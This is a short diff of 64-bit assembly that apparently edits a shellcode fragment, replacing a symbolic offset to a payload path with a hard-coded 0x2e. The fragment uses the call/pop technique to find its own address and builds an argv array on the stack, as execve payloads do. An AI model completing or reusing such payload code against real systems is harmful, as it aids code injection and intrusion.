@@ -3,7 +3,7 @@ BITS 64
 call path
 path:
 	pop rbx
-	lea rdi, [rbx + payload_path - path]
+	lea rdi, [rbx + 0x2e]
 	push 0
 	push rdi
 	mov rsi, rsp
